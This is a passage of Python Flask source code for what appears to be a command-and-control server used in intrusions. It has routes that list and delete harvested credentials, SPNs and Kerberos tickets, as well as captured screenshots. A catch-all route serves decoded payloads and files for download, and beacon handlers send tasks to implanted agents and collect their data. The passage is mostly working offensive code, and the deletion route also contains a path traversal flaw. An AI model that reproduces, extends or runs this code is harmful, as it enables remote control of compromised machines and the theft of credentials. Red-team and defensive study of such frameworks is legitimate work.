def list_screenshots():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    data = glob.glob("data/screenshots/*")
    data = map(lambda x: str.replace(x, "data/screenshots/", ""), data)
    
    resp = Response(json.dumps(data))
    return resp

# DELET SCREENSHOT
@app.route('/screenshots/del')
def screenshots_del():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    name = request.args.get('v')
    os.remove("data/screenshots/"+name)
    
    resp = Response(name)
    return resp

# LIST CREDENTIALS
@app.route('/credentials')
def list_credentials():
    # VERIFY IF SOURCE IP IS ALLOWED
    #if validate_source_ip(request): return render_template('errors/404.html'), 404
    if validate_source_ip(request): return get_profile_headers_denied()
    
    resp = Response(json.dumps(gdata.credentials))
    return resp

# LIST CREDENTIALS
@app.route('/credentials/del')
def credentials_del():
    # VERIFY IF SOURCE IP IS ALLOWED
    #if validate_source_ip(request): return render_template('errors/404.html'), 404
    if validate_source_ip(request): return get_profile_headers_denied()
    
    global gdata
    
    v_id = request.args.get('id')
    del gdata.credentials[v_id]
     
    # STORE CREDENTIALS
    store_credentials()
    
    resp = Response("Ok")
    return resp

# LIST CREDENTIALS SPN
@app.route('/credentials/spn')
def list_credentials_spn():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    resp = Response(json.dumps(gdata.credentials_spn))
    return resp

# LIST CREDENTIALS KERBEROS TICKET
@app.route('/credentials/ticket')
def list_credentials_ticket():
    # VERIFY IF SOURCE IP IS ALLOWED
    if validate_source_ip(request): return get_profile_headers_denied()
    
    resp = Response(json.dumps(gdata.credentials_ticket))
    return resp

# DEFAULT [GET]
# REF: http://flask.pocoo.org/snippets/57/
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    profile = load_profile(profile_file)
    
    # CHECK WEB DELIVERY PATHS
    global web_delivery
    global payload
    
    for v_id in web_delivery:
        if web_delivery[v_id]["path"] == "/"+path:
            save_log_raw_alert(request, "info", "web delivery")
            if web_delivery[v_id]["payload_type"] == "code":
                payload_id = web_delivery[v_id]["payload"]
                payload_code = base64.b64decode(payload[payload_id]["payload"])
                resp = Response(payload_code)
                resp.headers["Access-Control-Allow-Origin"] = "*"
                if web_delivery[v_id]["type"] == "download":
                    resp.headers["Content-Disposition"] = "attachment; filename=" + web_delivery[v_id]["filename"]
                return resp
            elif web_delivery[v_id]["payload_type"] == "file":
                filename = "payload_file/" + web_delivery[v_id]["filename"]
                data = open(filename, "rb")
                resp = Response(data)
                resp.headers["Content-Disposition"] = "attachment; filename=" + web_delivery[v_id]["filename"]
                return resp
            
    # CHECK IF BEACON GET
    # [GET] BEACON: SEND TASK TO AGENT
    if "/"+path == profile["http-get"]["uri"]:
        #print "PROFILE " + str(path)
        return beaconSendTask(request)

    # CHECK IF STAGER AND RETURNS PROFILE
    try: return setAgent(request)
    except: pass

    save_log_raw_alert(request, "warning", "path not found")
    
    #resp = render_template('errors/404.html'), 404
    resp = make_response(render_template('errors/404.html'), 404)
    resp = set_headers(profile, "http-get", resp)
    return resp
    
# DEFAULT [POST]
@app.route('/', defaults={'path': ''}, methods=['POST'])
@app.route('/<path:path>', methods=['POST'])
def catch_all_post(path):
    profile = load_profile(profile_file)
    
    # CHECK PROFILE PATHS
    # [POST] BEACON: GET DATA FROM AGENT
    if "/"+path == profile["http-post"]["uri"]:
        #print "PROFILE " + str(path)
        return beaconGetData(request)
    
    save_log_raw_alert(request, "warning", "path not found")
    
    return render_template('errors/404.html'), 404

# SHUTDOWN FLASK APP
@app.route('/shutdown')
def shutdown():
    flask_shutdown()
    return 'Server shutting down...'

#app.run(host='0.0.0.0', port=80, debug=True)

if __name__ == "__main__":
    try:
        
        print "Starting Server   %s%s:%s%s" %  (bcolors.BOLD, server_ip, server_port, bcolors.ENDC)
        c2 = threading.Thread(name=str(server_port), target=flask_init, args=(1,server_port))
        c2.setDaemon(True)
        c2.start()
        
        for port in listener:
            print "Starting Listener %s%s:%s%s" % (bcolors.BOLD, listener_details[port]["host"], port, bcolors.ENDC)
            listener[port] = threading.Thread(name=str(port), target=flask_init, args=(1,port))
            listener[port].setDaemon(True)
            listener[port].start()
            listener_details[port]["open"] = True
        print ""
        
        while True:
            pass
            time.sleep(0.2)
    
    except KeyboardInterrupt:
        print
        print "Shutting down..."
    except Exception as e:
        print traceback.print_exc()
    finally:
        print "bye ;)"
